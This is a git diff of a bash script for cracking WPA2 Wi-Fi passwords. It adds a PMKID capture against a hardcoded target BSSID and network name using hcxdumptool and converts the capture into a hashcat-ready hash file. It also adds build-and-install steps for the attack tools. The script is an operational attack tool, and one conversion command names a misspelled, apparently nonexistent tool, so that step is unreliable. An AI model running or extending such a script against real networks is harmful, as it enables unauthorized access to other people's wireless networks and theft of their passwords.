@@ -29,13 +29,20 @@ setup_wireless_adapter() {
 }
 
 do_four_way_method() {
-  echo "test"
-  sleep 5
-  airodump-ng $interface_name
+  sudo airodump-ng $interface_name
 }
 
 do_pmkid_hashcat() {
-  echo
+  target_bssid='9C:6F:52:36:73:01'
+  target_essid='H369A367301'
+
+  echo $target_bssid >> bssid_target.txt
+
+  hcxdumptool -i $interface_name --filterlist_ap=bssid_target.txt --filtermode=2 --enable_status=2 -o pmkid.pcap
+
+  # Inevitably you can hit Ctrl-C, then we convert the PMKID capture into hashcat format
+  hcxpcatool -z target_wpa2_pmkid_hash.txt pmkid.pcap
+
 }
 
 crack_password() {
@@ -45,7 +52,22 @@ crack_password() {
 install_dependencies() {
   echo "Install all dependencies required for this script"
   echo "1. Aircrack-NG"
-  sudo apt install aircrack-ng
+  sudo apt install -y aircrack-ng
+
+  echo "2. Hcxdumptool"
+  sudo apt-get install -y libcurl4-openssl-dev libssl-dev pkg-config
+  git clone https://github.com/ZerBea/hcxdumptool.git
+  cd hcxdumptool
+  make
+  sudo make install
+  cd -
+
+  echo "3. Hcxtools"
+  git clone https://github.com/ZerBea/hcxtools.git
+  cd hcxtools
+  make
+  sudo make install
+  cd -
 }
 
 
